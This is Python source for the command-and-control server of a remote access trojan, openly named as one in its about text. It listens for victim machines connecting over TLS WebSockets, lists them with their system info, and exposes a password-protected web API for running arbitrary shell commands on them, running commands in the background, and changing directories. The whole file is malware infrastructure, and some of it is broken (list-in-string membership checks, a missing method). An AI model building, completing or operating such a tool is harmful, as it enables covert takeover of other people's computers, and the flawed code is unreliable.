__author__ = "赵博凯"
__license__ = "GPL v3"

from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
import asyncio
import websockets
import hashlib
import ssl
import rich
import json
from sys import exit
import logging

import rich.traceback 

# 安装rich的回溯追踪，显示本地变量
rich.traceback.install(show_locals=True)

# --- 基础配置 ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
app = Quart(__name__)
HOST = '0.0.0.0' 
PORT = 8765
WEB_PORT = 5000  # Web界面端口
SSL_CERT = '../cert.pem' 
SSL_KEY = '../key.pem'
SECURITY_PATH = 'fuck'
SECURITY_PASSWORD_HASH = '6ac3c336e4094835293a3fed8a4b5fedde1b5e2626d9838fed50693bba00af0e' 

# --- 全局变量 ---
control_list = {}

# --- 服务器逻辑 ---
class Server:
    def __init__(self):
        pass

    def about(self):
        about_text = '''关于：
作者：赵博凯
版权：Copyright © 赵博凯, All Rights Reserved.
此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
使用GPL v3协议，请自觉遵守协议。'''
        return about_text
    
    def client_list(self):
        if len(control_list) == 0:
            return "当前没有设备连接。"
        else:
            devices = []
            for device in control_list.items():
                devices.append({
                    'id': device[0],
                    'ip': device[1]['ip'],
                    'status': device[1]['status'],
                    'systeminfo': device[1]['systeminfo']
                })
            logging.info(f"设备列表：{devices}")
            return devices
    
    async def delete(self, id):
        global control_list
        if id in control_list:
            websocket_ = control_list[id]['websocket']
            try:
                await websocket_.send("exit")
                control_list.pop(id)
                logging.info(f"成功删除ID为{id}的设备。")
                return f"成功删除ID为{id}的设备。"
            except Exception as e:
                control_list.pop(id)
                logging.warning(f"断开设备ID为{id}的连接时发生异常: {e}")
                return f"断开设备ID为{id}的连接时发生异常: {e}"
        else:
            logging.error(f"设备ID为{id}的设备不存在。")
            return f"设备ID为{id}的设备不存在。"

# --- 操纵目标设备逻辑 ---
class ControlClient:
    def __init__(self, id):
        self.id = id
        self.websocket = control_list[id]['websocket']
    
    async def execute_command(self, command):
        await self.websocket.send(f"command:{command}")
        result = await self.websocket.recv()
        logging.info(f"执行命令：{command}，结果：{result}")
        return result

    async def background(self, command):
        await self.websocket.send(f"background:{command}")
        await self.websocket.recv()
        logging.info(f"后台执行命令：{command}")
        return "命令已发送"

    async def change_directory(self, directory):
        await self.websocket.send(f"cd:{directory}")
        result = await self.websocket.recv()
        logging.info(f"切换目录：{directory}，结果：{result}")
        return result

# --- Quart 网页端逻辑和异步请求处理 ---

# --- 安全性检查 ---
def check():
    logging.info(f"cookie: {request.cookies}")
    if "Cookie" not in request.cookies:
        return False
    if request.cookies.get('Cookie') == hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest():
        logging.info("通过")
        return True
    else:
        logging.info("未通过")
        return False

# --- 密码输入检测 ---
@app.route(f"/{SECURITY_PATH}/verify", methods=['POST'])
async def verify():
    json = await request.get_json()
    if "password" not in json: return jsonify({'error': '未提供密码'}), 400
    password = json["password"]
    if hashlib.sha256(password.encode()).hexdigest() == SECURITY_PASSWORD_HASH:
        #验证成功返回登录后的cookie
        cookie = hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest()
        return jsonify({'Cookie': cookie})
    else: return jsonify({'error': '密码错误'}), 401

# --- api接口 ---
@app.route(f"/{SECURITY_PATH}/function/", methods=['POST'])
async def function():
    # 安全性检查
    if not check(): return jsonify({'error': '未授权'}), 401
    # 处理请求
    json = await request.get_json()
    if "func_name" not in json: return jsonify({'error': '未提供函数名'}), 400
    func_name = json["func_name"]
    if ["device_list", 
        "delete", 
        "execute_command", 
        "background", 
        "change_directory"] not in func_name:
        return jsonify({'error': '未提供有效的函数名'}), 400

    server = Server()

    try:
        if func_name == "device_list": return jsonify(await server.device_list())
        if "id" not in json: return jsonify({'error': '未提供设备ID'}), 400
        device_id = json["id"]
        if device_id not in server.client_list(): return jsonify({'error': '设备ID不存在'}), 400
        if func_name == "delete": return jsonify({"message": await server.delete(device_id)})
        control_client = ControlClient(device_id)
        if ["execute_command", "background"] in func_name:
            if "command" not in json: return jsonify({'error': '未提供命令'}), 400
            command = json["command"]
            if func_name == "execute_command": return jsonify({"result": await control_client.execute_command(command)})
            if func_name == "background": return jsonify({"result": await control_client.background(command)})
        if func_name == "change_directory":
            if "directory" not in json: return jsonify({'error': '未提供目录'}), 400
            directory = json["directory"]
            return jsonify({"result": await control_client.change_directory(directory)})
    except Exception as e:
        logging.error(f"处理请求时发生异常: {type(e)}: {e}")
        return jsonify({'error': f"{type(e)}: {e}"}), 500

# --- 被客户端连接处理逻辑 ---
# 使用 websockets, 不走quart websocket
async def handle_client(websocket):
    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
    try:
        systeminfo = await websocket.recv()
    except Exception:
        systeminfo = "ERROR"
    
    control_list[str(websocket.id)] = {
        "ip": ip,
        "status": "connected",
        "websocket": websocket,
        "systeminfo": systeminfo
    }
    logging.info(f"设备 {ip} 连接成功, 系统信息: {systeminfo}")
    await websocket.wait_closed()

# --- 检查客户端连接状态 ---
async def check_clients_connection():
    global control_list
    while True:
        if len(control_list) > 0:
            for device in list(control_list.items()):
                try:
                    await device[1]['websocket'].ping()
                    control_list[device[0]]['status'] = "connected"
                except Exception as e:
                    logging.warning(f"设备 {device[0]} 断开连接: {e}")
                    control_list[device[0]]['status'] = "disconnected"
        await asyncio.sleep(10)

# --- 服务器启动逻辑 ---
async def server_loop():
    logging.info(f"正在配置证书文件, 证书位置: {SSL_CERT}, 密钥位置: {SSL_KEY}")
    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
    except FileNotFoundError:
        logging.error("证书文件或密钥文件不存在，请检查配置。")
        exit()

    logging.info(f"正在启动服务器, 监听地址: {HOST}, 端口: {PORT}")
    async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
        try:
            await asyncio.Event().wait()  # Await something cancellable on SIGINT
        except KeyboardInterrupt:
            exit()

async def main():
    logging.info("正在启动程序...")
    # 运行WebSocket服务器和连接检查
    await asyncio.gather(
        server_loop(),
        check_clients_connection(),
        app.run_task(host='0.0.0.0', port=WEB_PORT)
    )

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        logging.info("版权所有：Copyright © 赵博凯, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.warning("用户手动中断程序。")
        exit()
    except Exception as e:
        logging.error(f"错误: {e}，请报告到[link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")